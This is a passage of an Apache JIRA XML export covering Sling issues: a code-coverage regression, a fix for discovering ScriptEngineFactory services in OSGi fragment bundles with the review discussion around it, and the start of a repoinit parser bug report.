                            <comment id="17558209" author="olli" created="Thu, 23 Jun 2022 19:40:44 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=ashokmca07%40gmail.com&quot; class=&quot;user-hover&quot; rel=&quot;ashokmca07@gmail.com&quot;&gt;ashokmca07@gmail.com&lt;/a&gt;, It looks like not only PRs were broken but also regular builds of master (before June 21st):&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;image-wrap&quot; style=&quot;&quot;&gt;&lt;img src=&quot;https://issues.apache.org/jira/secure/attachment/13045518/13045518_coverage-scripting-groovy.png&quot; width=&quot;600&quot; style=&quot;border: 0px solid black&quot; /&gt;&lt;/span&gt;&lt;br/&gt;
&lt;a href=&quot;https://sonarcloud.io/project/overview?id=apache_sling-org-apache-sling-scripting-groovy&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://sonarcloud.io/project/overview?id=apache_sling-org-apache-sling-scripting-groovy&lt;/a&gt;&lt;br/&gt;
&lt;span class=&quot;image-wrap&quot; style=&quot;&quot;&gt;&lt;img src=&quot;https://issues.apache.org/jira/secure/attachment/13045519/13045519_coverage-scripting-thymeleaf.png&quot; width=&quot;600&quot; style=&quot;border: 0px solid black&quot; /&gt;&lt;/span&gt;&lt;br/&gt;
&lt;a href=&quot;https://sonarcloud.io/project/overview?id=apache_sling-org-apache-sling-scripting-thymeleaf&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://sonarcloud.io/project/overview?id=apache_sling-org-apache-sling-scripting-thymeleaf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Due to INFRA-23413 I cannot see if the issue is fixed.&lt;/p&gt;</comment>
                            <comment id="17558210" author="kwin" created="Thu, 23 Jun 2022 19:41:57 +0000"  >&lt;p&gt;Yes, coverage in general was not working. Should be fixed though.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310050">
                    <name>Regression</name>
                                                                <inwardlinks description="is broken by">
                                        <issuelink>
            <issuekey id="13343241">SLING-9948</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                            <attachment id="13045518" name="coverage-scripting-groovy.png" size="1040937" author="olli" created="Thu, 23 Jun 2022 19:32:36 +0000"/>
                            <attachment id="13045519" name="coverage-scripting-thymeleaf.png" size="1024450" author="olli" created="Thu, 23 Jun 2022 19:32:36 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>2.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 17 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z13fmo:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11398] handle serviceloader ScriptEngineFactory defined in a fragment bundle</title>
                <link>https://issues.apache.org/jira/browse/SLING-11398</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Handle loading of ScriptEngineFactory service loader (/META-INF/services/javax.script.ScriptEngineFactory) files that exist in a fragment.&lt;/p&gt;

&lt;p&gt;For example, consider the groovy ScriptEngine included in the starter that has these:&lt;/p&gt;

&lt;p&gt;&#160; &#160; Host Bundle - org.codehaus.groovy:groovy:3.0.9&lt;/p&gt;

&lt;p&gt;&#160; &#160; Fragment - org.codehaus.groovy:groovy-jsr223:3.0.9&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Expected:&lt;/p&gt;

&lt;p&gt;The groovy ScriptEngineFactory declared in the groovy-jsr223 fragment should be discovered and made available.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13450778">SLING-11398</key>
            <summary>handle serviceloader ScriptEngineFactory defined in a fragment bundle</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="enorman">Eric Norman</assignee>
                                    <reporter username="enorman">Eric Norman</reporter>
                        <labels>
                    </labels>
                <created>Sun, 19 Jun 2022 00:01:38 +0000</created>
                <updated>Thu, 5 Sep 2024 06:04:40 +0000</updated>
                            <resolved>Tue, 28 Jun 2022 19:13:33 +0000</resolved>
                                                    <fixVersion>Scripting Core 2.4.10</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="5400">1.5h</timespent>
                                <comments>
                            <comment id="17556123" author="enorman" created="Sun, 19 Jun 2022 20:26:38 +0000"  >&lt;p&gt;PR #18 has the proposed changes for review and feedback&lt;/p&gt;</comment>
                            <comment id="17556333" author="olli" created="Mon, 20 Jun 2022 11:24:54 +0000"  >&lt;p&gt;Note: The scripting support for Groovy in Sling (based on &lt;tt&gt;groovy.text.GStringTemplateEngine&lt;/tt&gt;) is provided by&#160;&lt;tt&gt;org.apache.sling.scripting.groovy&lt;/tt&gt; and only some additional Groovy versions were released as fragments.&lt;/p&gt;</comment>
                            <comment id="17556445" author="enorman" created="Mon, 20 Jun 2022 16:14:05 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=olli&quot; class=&quot;user-hover&quot; rel=&quot;olli&quot;&gt;olli&lt;/a&gt; Can you please clarify if your comment means you are for or against the proposed changes?&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;only some additional Groovy versions were released as fragments.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Can you clarify what you mean by that?&#160; As far as I can tell, all the 2.x groovy releases since 2.5 (plus the 3.x versions) have the ScriptEngineFactory declared in the groovy-jsr223 fragment and no groovy-all uber bundle exists anymore.&#160; Are you referring to groovy 4.x and later where groovy-jsr223 doesn&apos;t appear to be a fragment anymore?&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Perhaps, I should clarify that my primary motivation here is to resolve &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11141&quot; title=&quot;Make compatible with org.apache.felix.healthcheck.generalchecks version 3.x&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11141&quot;&gt;&lt;del&gt;SLING-11141&lt;/del&gt;&lt;/a&gt; and that testing my solution to that issue revealed these findings:&lt;/p&gt;
&lt;ol&gt;
	&lt;li&gt;The &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-starter/blob/master/src/main/features/groovy.json&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&quot;groovy&quot; feature&lt;/a&gt; of the the starter contains the &quot;org.codehaus.groovy:groovy-jsr223:3.0.9&quot; artifact.&#160; Why include that if it isn&apos;t going to be processed and used?&lt;/li&gt;
	&lt;li&gt;The sling &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-hc-support/blob/0612300a698b5d9ffa6132256ad0c8e0eae72aca/src/main/java/org/apache/sling/hc/support/impl/ScriptedHealthCheck.java#L85&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;ScriptedHealhCheck&lt;/a&gt; has a default config that declares &quot;groovy&quot; as the script language which doesn&apos;t match what is provided by org.apache.sling.scripting.groovy&lt;/li&gt;
	&lt;li&gt;Similary, the felix generalchecks &lt;a href=&quot;https://github.com/apache/felix-dev/blob/eb99876e44791648939cb0fc7fdee22f00ed27b8/healthcheck/generalchecks/src/main/java/org/apache/felix/hc/generalchecks/ScriptedHealthCheck.java#L79&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;ScriptedHealthCheck&lt;/a&gt; has the same &quot;groovy&quot; language in the default config&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;&#160;&lt;/p&gt;</comment>
                            <comment id="17556538" author="olli" created="Mon, 20 Jun 2022 20:05:40 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=enorman&quot; class=&quot;user-hover&quot; rel=&quot;enorman&quot;&gt;enorman&lt;/a&gt;, I hadn&apos;t a chance to checkout and test with different Groovy versions so far, but reads reasonable.&lt;/p&gt;

&lt;p&gt;Sling Scripting Groovy is not using the &lt;tt&gt;ScriptEngineFactory&lt;/tt&gt; from &lt;tt&gt;groovy-jsr223&lt;/tt&gt;. It brings its own &lt;tt&gt;ScriptEngineFactory&lt;/tt&gt; and &lt;tt&gt;ScriptEngine&lt;/tt&gt; which is using &lt;tt&gt;groovy.text.GStringTemplateEngine&lt;/tt&gt; (3.0.x). It therefore depends only on &lt;tt&gt;groovy&lt;/tt&gt;, &lt;tt&gt;groovy-json&lt;/tt&gt; and &lt;tt&gt;groovy-templates&lt;/tt&gt;. &lt;tt&gt;groovy-templates&lt;/tt&gt; 3.0.1 is a regular bundle but 3.0.11 (latest 3.x) is a fragment for example.&lt;/p&gt;

&lt;p&gt;1. &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=dklco&quot; class=&quot;user-hover&quot; rel=&quot;dklco&quot;&gt;dklco&lt;/a&gt; added the Groovy bundles, AFAIR for Sling CMS, not for Sling Scripting Groovy&lt;br/&gt;
2./3. Right, Sling Scripting Groovy defaults now to &lt;tt&gt;gstring&lt;/tt&gt; (but it&apos;s configurable) and to &lt;tt&gt;gsp&lt;/tt&gt; (Groovy Server Pages) in older versions (see &lt;a href=&quot;https://docs.groovy-lang.org/docs/next/html/documentation/template-engines.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;Groovy template engines&lt;/a&gt; why it seems to be wrong). Both HCs do not target Sling Scripting Groovy. &lt;tt&gt;groovy&lt;/tt&gt; was only used in an older version of Sling Scripting Groovy as compatible name (&lt;tt&gt;compatible.javax.script.name&lt;/tt&gt;).&lt;/p&gt;

&lt;p&gt;Did you check if the &lt;tt&gt;ScriptEngine&lt;/tt&gt; from &lt;tt&gt;groovy-jsr223&lt;/tt&gt; works with Sling Scripting?&lt;/p&gt;</comment>
                            <comment id="17556539" author="olli" created="Mon, 20 Jun 2022 20:07:38 +0000"  >&lt;p&gt;See also &lt;a href=&quot;https://sling.apache.org/documentation/bundles/scripting.html#sling-scripting-engines&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://sling.apache.org/documentation/bundles/scripting.html#sling-scripting-engines&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17556555" author="enorman" created="Mon, 20 Jun 2022 21:41:15 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=olli&quot; class=&quot;user-hover&quot; rel=&quot;olli&quot;&gt;olli&lt;/a&gt; My use case was for running scripts as a HealthCheck.&#160; Using groovy-jsr223 with sling scripting wasn&apos;t really my primary use case, but I just tried the &quot;Run Groovy Scripts&quot; technique in composum described at the link #1 below and it seemed to work.&#160; After using composum to manually create a &quot;/apps/sling/servlet/default/groovy1.groovy&quot; file I could run it as a script within the composum ui and also get the same output from browsing to &lt;a href=&quot;http://localhost:8080/content/slingshot.groovy1&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;http://localhost:8080/content/slingshot.groovy1&lt;/a&gt; so it seems to be working for that simple test.&#160; &#160;That manual test was using the current starter that does not have the org.apache.sling.scripting.groovy deployed at all.&#160;&#160;&lt;/p&gt;

&lt;p&gt;Or did you have a specific test suite in mind that could be run to verify sling scripting with that groovy ScriptEngine is working as you expected?&lt;/p&gt;
&lt;ol&gt;
	&lt;li&gt;&lt;a href=&quot;https://blogs.perficient.com/2020/05/12/4-useful-features-of-composum-browser/&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://blogs.perficient.com/2020/05/12/4-useful-features-of-composum-browser/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</comment>
                            <comment id="17557083" author="olli" created="Tue, 21 Jun 2022 19:51:26 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=enorman&quot; class=&quot;user-hover&quot; rel=&quot;enorman&quot;&gt;enorman&lt;/a&gt;, Felix HC comes with its own &lt;a href=&quot;https://github.com/apache/felix-dev/blob/master/healthcheck/generalchecks/src/main/java/org/apache/felix/hc/generalchecks/util/ScriptEnginesTracker.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;tt&gt;ScriptEnginesTracker&lt;/tt&gt;&lt;/a&gt;. So how should enhancing Sling Scripting Core help?&lt;br/&gt;
And the Groovy Runner in Composum Nodes is not using JSR 223 (&lt;tt&gt;javax.script&lt;/tt&gt;) at all, see &lt;a href=&quot;https://github.com/ist-dresden/composum-nodes/blob/dad4929d332358cb35d494f4e48e94a9f2806566/commons/src/main/java/com/composum/sling/core/script/GroovyRunner.java#L100&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;tt&gt;run(...)&lt;/tt&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;No specific test suite in mind, we have some basic tests in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-groovy/tree/master/src/test/java/org/apache/sling/scripting/groovy/it/tests&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;Scripting Groovy&lt;/a&gt; and &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-freemarker/tree/master/src/test/java/org/apache/sling/scripting/freemarker/it/tests&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;Scripting FreeMarker&lt;/a&gt;.&lt;/p&gt;</comment>
                            <comment id="17557088" author="olli" created="Tue, 21 Jun 2022 19:57:32 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=enorman&quot; class=&quot;user-hover&quot; rel=&quot;enorman&quot;&gt;enorman&lt;/a&gt;, The IT breaks when using Groovy 3.0.1. So you should add an additional comment about the &quot;fixed&quot; version (needs to be a fragment).&lt;/p&gt;</comment>
                            <comment id="17557089" author="enorman" created="Tue, 21 Jun 2022 20:02:07 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=olli&quot; class=&quot;user-hover&quot; rel=&quot;olli&quot;&gt;olli&lt;/a&gt;&#160;&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Felix HC comes with its own &lt;a href=&quot;https://github.com/apache/felix-dev/blob/master/healthcheck/generalchecks/src/main/java/org/apache/felix/hc/generalchecks/util/ScriptEnginesTracker.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;tt&gt;ScriptEnginesTracker&lt;/tt&gt;&lt;/a&gt;. So how should enhancing Sling Scripting Core help?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;What are you referring to here?&#160; The proposed changes for this issue in PR #18&#160; don&apos;t have anything to do with Felix HC or it&apos;s private ScriptEnginesTracker.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;And the Groovy Runner in Composum Nodes is not using JSR 223 (&lt;tt&gt;javax.script&lt;/tt&gt;) at all,&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Fair enough, I didn&apos;t look at the Composum code too closely.&#160; Hopefully you would concede that the &quot;browsing&quot; to /content/slingshot.groovy1 that I also described does flow though the sling scripting and the JSR223 ScriptEngine that we are talking about here.&lt;/p&gt;</comment>
                            <comment id="17557092" author="enorman" created="Tue, 21 Jun 2022 20:08:58 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=olli&quot; class=&quot;user-hover&quot; rel=&quot;olli&quot;&gt;olli&lt;/a&gt;&#160;&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;The IT breaks when using Groovy 3.0.1. So you should add an additional comment about the &quot;fixed&quot; version (needs to be a fragment).&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Well, the test is specifically for testing a factory declared in a fragment per the comment at the top of the test class.&#160; The 3.0.1 version works if you remove the &quot;.noStart()&quot; statement that keeps it from trying to start the fragment bundle.&#160; But that is not the point of this test.&#160; It seems that Jsr223ScriptEngineBundleIT would cover the non-fragment scenario.&lt;/p&gt;</comment>
                            <comment id="17557099" author="olli" created="Tue, 21 Jun 2022 20:18:24 +0000"  >&lt;blockquote&gt;&lt;p&gt;Well, the test is specifically for testing a factory declared in a fragment per the comment at the top of the test class.&#160; The 3.0.1 version works if you remove the &quot;.noStart()&quot; statement that keeps it from trying to start the fragment bundle.&#160; But that is not the point of this test.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Sure, but it&apos;s not obvious to everyone that additional Groovy artifacts were sometimes released as regular bundles and sometimes as fragments. So we should have a clear statement that a fragment is required here.&lt;/p&gt;</comment>
                            <comment id="17557102" author="olli" created="Tue, 21 Jun 2022 20:23:59 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=enorman&quot; class=&quot;user-hover&quot; rel=&quot;enorman&quot;&gt;enorman&lt;/a&gt;, You mentioned above HCs as your primary motivation. How should your PR or this issue help here? Note: I&apos;m not against the improvement. It will help with some versions of &lt;tt&gt;groovy-jsr223&lt;/tt&gt;.&lt;/p&gt;</comment>
                            <comment id="17557103" author="enorman" created="Tue, 21 Jun 2022 20:24:53 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=olli&quot; class=&quot;user-hover&quot; rel=&quot;olli&quot;&gt;olli&lt;/a&gt;&#160;&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Sure, but it&apos;s not obvious to everyone that additional Groovy artifacts were sometimes released as regular bundles and sometimes as fragments. So we should have a clear statement that a fragment is required here.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;What is unclear about the comments in that test class?&#160; It states in two places that it is for a fragment.&#160; Once at the top of the class and again right above where the groovy-jsr223 is added to the configuration.&#160; People shouldn&apos;t be looking here for an explanation of the differences between groovy versions.&lt;/p&gt;</comment>
                            <comment id="17557109" author="enorman" created="Tue, 21 Jun 2022 20:31:53 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=olli&quot; class=&quot;user-hover&quot; rel=&quot;olli&quot;&gt;olli&lt;/a&gt;&#160;&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;You mentioned above HCs as your primary motivation. How should your PR or this issue help here? Note: I&apos;m not against the improvement. It will help with some versions of &lt;tt&gt;groovy-jsr223&lt;/tt&gt;.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Ok.&#160; Well this change is not directly related to the HC fix, but it is intended to maintain parity to the HC impl.&#160; I also made a similar PR for the private tracker used in the felix HC at &lt;a href=&quot;https://issues.apache.org/jira/browse/FELIX-6542&quot; title=&quot;ScriptedHealthCheck should handle ScriptEngineFactory defined in a fragment bundle&quot; class=&quot;issue-link&quot; data-issue-key=&quot;FELIX-6542&quot;&gt;&lt;del&gt;FELIX-6542&lt;/del&gt;&lt;/a&gt; that is pending and waiting to be reviewed.&#160; I&apos;m not a FELIX committer.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;UPDATE:&#160; After further review, the &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11141&quot; title=&quot;Make compatible with org.apache.felix.healthcheck.generalchecks version 3.x&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11141&quot;&gt;&lt;del&gt;SLING-11141&lt;/del&gt;&lt;/a&gt; solution now could depend on this change as that solution now delegates to the sling ScriptEngineManager to get the ScriptEngine rather than using another tracker.&#160; This was to decouple from felix impl.&lt;/p&gt;</comment>
                            <comment id="17557124" author="olli" created="Tue, 21 Jun 2022 20:59:47 +0000"  >&lt;blockquote&gt;&lt;p&gt;What is unclear about the comments in that test class?&#160; It states in two places that it is for a fragment.&#160; Once at the top of the class and again right above where the groovy-jsr223 is added to the configuration.&#160; People shouldn&apos;t be looking here for an explanation of the differences between groovy versions.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;People tend to update versions without understanding the impact. Therefore I prefer to have an extended comment:&lt;br/&gt;
&lt;tt&gt;// factory is defined in this fragment artifact &#8211; other versions of this bundle (e.g. 3.0.1) were released as regular bundle, not as fragment&lt;/tt&gt;&lt;/p&gt;</comment>
                            <comment id="17557143" author="enorman" created="Tue, 21 Jun 2022 21:55:36 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=olli&quot; class=&quot;user-hover&quot; rel=&quot;olli&quot;&gt;olli&lt;/a&gt; Updated the comment at: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-core/pull/18/commits/14d248e71ba4ad94c752d666b72b7c4af9ac8f53&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;14d248e&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Any other concerns that would block moving forward?&lt;/p&gt;</comment>
                            <comment id="17557148" author="olli" created="Tue, 21 Jun 2022 22:17:42 +0000"  >&lt;p&gt;No, not at all. Go on.&lt;/p&gt;</comment>
                            <comment id="17559923" author="enorman" created="Tue, 28 Jun 2022 19:13:33 +0000"  >&lt;p&gt;Merged PR #18 at: &#160;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-core/commit/ffa2e01b22a3324a80fdd703efd8911e70856628&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;tt&gt;ffa2e01&lt;/tt&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 17 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z13cuo:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11384] Repoinitparserservice - create path on root level doesn&apos;t parse node type</title>
                <link>https://issues.apache.org/jira/browse/SLING-11384</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When calling the repoinitparserservice as follows:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
repoInitParserService.parse(&lt;span class=&quot;code-keyword&quot;&gt;new&lt;/span&gt; StringReader(&lt;span class=&quot;code-quote&quot;&gt;&quot;create path /(sling:redirect)\n&quot;&lt;/span&gt;)).get(0).asRepoInitString()  &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The result is:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
create path \n &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;What we expect is:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
create path /(sling:redirect)\n &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13448973">SLING-11384</key>
            <summary>Repoinitparserservice - create path on root level doesn&apos;t parse node type</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="Sc0rpic0m">Niek Raaijmakers</reporter>
                        <labels>
                    </labels>
                <created>Wed, 8 Jun 2022 10:06:41 +0000</created>
